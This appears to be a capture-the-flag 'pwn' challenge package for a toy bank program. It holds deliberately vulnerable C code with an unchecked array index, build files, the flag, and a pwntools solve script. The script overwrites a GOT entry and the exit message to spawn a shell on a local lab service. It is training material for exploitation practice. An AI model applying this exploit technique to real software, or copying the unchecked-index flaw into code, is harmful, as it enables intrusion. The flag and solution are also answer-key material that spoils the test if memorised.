{
    "bank.c": "#include <stdio.h>\n\nlong accounts[100];\nchar exit_msg[] = \"Have a nice day!\";\n\nvoid deposit() {\n    int index = 0;\n    long amount = 0;\n    puts(\"Enter the number (0-100) of the account you want to deposit in: \");\n    scanf(\"%d\", &index);\n    puts(\"Enter the amount you want to deposit: \");\n    scanf(\"%ld\", &amount);\n    accounts[index] += amount;\n}\n\nint main() {\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stdin, NULL, _IONBF, 0);\n    deposit();\n    deposit();\n    puts(exit_msg);\n}\n",
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n",
    "flag.txt": "gigem{a_v3ry_h3fty_d3p0s1t}\n",
    "Makefile": "CC := $(or $(CC),gcc)\nCFLAGS := -O3 -Wl,-z,norelro -no-pie\nNAME := bank\nPORT := 7003\nall: $(NAME)\n\nclean: .PHONY\n\tdocker container rm -f $(NAME)\n\trm -f $(NAME) $(NAME).zip libc.so.6\n\n$(NAME): $(NAME).c\n\t$(CC) $(CFLAGS) $^ -o $@\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) $(NAME)\n\tdocker cp $(id):/lib/x86_64-linux-gnu/libc-2.28.so libc.so.6\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c libc.so.6\n\n.PHONY:\n",
    "README.md": "# Bank\n\nAuthor: `nhwn`\n\nI came up with this banking system that lets you deposit as much as you want. I'm not sure why, but my friend said it was a terrible idea...\n\n## Dev Notes\nRun `make extract` to get the zip archive.\n\n## Solution\nWe're given 2 arbitrary writes (although the writes are additions of an arbitrary value rather than a simple assignment). Our goal is to overwrite the exit message to be \"/bin/sh\" and the GOT entry for `puts` to be `system`. Since our writes are additions, we don't need to worry about ASLR and can just directly compute the offset between `system` and `puts`. See `solve.py` for the full script.\n",
    "solve.py": "from pwn import *\n\nFILE = \"./bank\"\n\n#p = process(FILE)\np = remote(\"127.0.0.1\", 7003)\ne = ELF(FILE)\nlibc = ELF(\"./libc-2.28.so\")\n\nsystem_offset = libc.sym['system']\nputs_offset = libc.sym['puts']\n\nexit_msg_addr = e.sym['exit_msg']\naccounts_addr = e.sym['accounts']\n\nputs_diff = int((e.got['puts'] - accounts_addr) / 8)\nsystem_diff = system_offset - puts_offset\nexit_msg_diff = int((exit_msg_addr - accounts_addr) / 8)\n\nstart_msg = b\"Have a n\"\nend_msg = b\"/bin/sh\\0\"\n\nmsg_diff = int.from_bytes(end_msg, 'little') - int.from_bytes(start_msg, 'little')\n\np.recvline()\np.sendline(str(exit_msg_diff).encode())\np.recvline()\np.sendline(str(msg_diff).encode())\np.recvline()\np.sendline(str(puts_diff).encode())\np.recvline()\np.sendline(str(system_diff).encode())\n\np.interactive()\n",
    "category": "pwn"
}